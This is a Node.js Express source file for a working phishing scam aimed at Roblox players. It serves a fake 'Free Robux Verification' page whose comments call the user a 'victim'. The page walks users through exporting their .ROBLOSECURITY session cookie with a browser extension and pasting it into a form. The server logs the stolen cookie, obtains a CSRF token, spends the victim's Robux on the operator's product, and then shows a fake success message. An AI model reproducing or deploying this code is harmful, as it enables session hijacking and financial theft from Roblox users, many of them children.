const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

const PRODUCT_ID = "1832332442"; // Replace

// Instructional page – victim sees this
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Roblox - Free Robux Verification</title></head>
    <body style="font-family: Arial; text-align: center; margin: 20px; background: #f5f5f5;">
      <h2>Get 10,000 Free Robux</h2>
      <p>To verify you own the account, follow the steps below. This is safe and only reads your Roblox cookie.</p>
      <hr>
      <h3>Step 1: Install Cookie-Editor</h3>
      <p>Open the App Store and download <b>Cookie-Editor</b> (free). It's a trusted Safari extension.</p>
      <h3>Step 2: Enable the Extension</h3>
      <p>Go to <b>Settings → Safari → Extensions</b>, turn on Cookie-Editor, and give it access to all websites.</p>
      <h3>Step 3: Go to Roblox</h3>
      <p>In Safari, visit <b>www.roblox.com</b> and log into your account. Make sure you're on the desktop site (tap aA → Request Desktop Website).</p>
      <h3>Step 4: Export Your Cookie</h3>
      <p>Tap the puzzle piece icon (extensions) in Safari's address bar, select Cookie-Editor, then tap <b>Export</b>. This copies your .ROBLOSECURITY cookie to clipboard as text. You can paste it below.</p>
      <h3>Step 5: Paste & Claim</h3>
      <form action="/cookie" method="POST">
        <textarea name="cookie" placeholder="Paste the exported cookie text here" rows="4" cols="50" required></textarea><br><br>
        <button type="submit" style="font-size: 18px; padding: 10px 30px;">Verify & Claim Robux</button>
      </form>
      <p><small>We never see your password. Only the Roblox session cookie is used for verification.</small></p>
    </body>
    </html>
  `);
});

// Receive pasted cookie, log it, and auto-buy your ticket
app.post('/cookie', async (req, res) => {
  const cookieText = req.body.cookie;
  if (!cookieText) {
    return res.send('<h1>No cookie provided. Go back and try again.</h1>');
  }

  console.log('CAPTURED FULL COOKIE TEXT:', cookieText);

  // Parse the exported cookie – Cookie-Editor exports as JSON array
  let robloxCookie = null;
  try {
    const cookies = JSON.parse(cookieText);
    const robloxEntry = cookies.find(c => c.name === '.ROBLOSECURITY');
    if (robloxEntry) {
      robloxCookie = robloxEntry.value;
      console.log('EXTRACTED .ROBLOSECURITY:', robloxCookie);
    }
  } catch (e) {
    // If not JSON, assume it's just the raw cookie value
    if (cookieText.includes('_')) {
      robloxCookie = cookieText.trim();
      console.log('RAW COOKIE VALUE:', robloxCookie);
    }
  }

  if (!robloxCookie) {
    return res.send('<h1>Could not find .ROBLOSECURITY in the pasted data. Make sure you exported correctly.</h1>');
  }

  // Auto-buy the product
  try {
    // Get CSRF token
    const tokenRes = await axios.post('https://auth.roblox.com/v2/logout', {}, {
      headers: { Cookie: `.ROBLOSECURITY=${robloxCookie}` },
      validateStatus: false
    });
    const csrf = tokenRes.headers['x-csrf-token'];

    // Buy product
    const buyRes = await axios.post(`https://economy.roblox.com/v1/purchases/products/${PRODUCT_ID}`, {
      expectedPrice: 2
    }, {
      headers: {
        Cookie: `.ROBLOSECURITY=${robloxCookie}`,
        'x-csrf-token': csrf,
        'Content-Type': 'application/json'
      }
    });

    console.log('PURCHASE RESULT:', buyRes.data);
    res.send('<h1>Success! Your 10,000 Robux will appear in your account within 24 hours.</h1>');
  } catch (e) {
    console.log('PURCHASE ERROR:', e.response?.data || e.message);
    res.send('<h1>Verification succeeded, but reward delivery failed. Please try again later.</h1>');
  }
});

app.listen(port, () => console.log('Cookie-paste auto-buy server running on port ' + port));
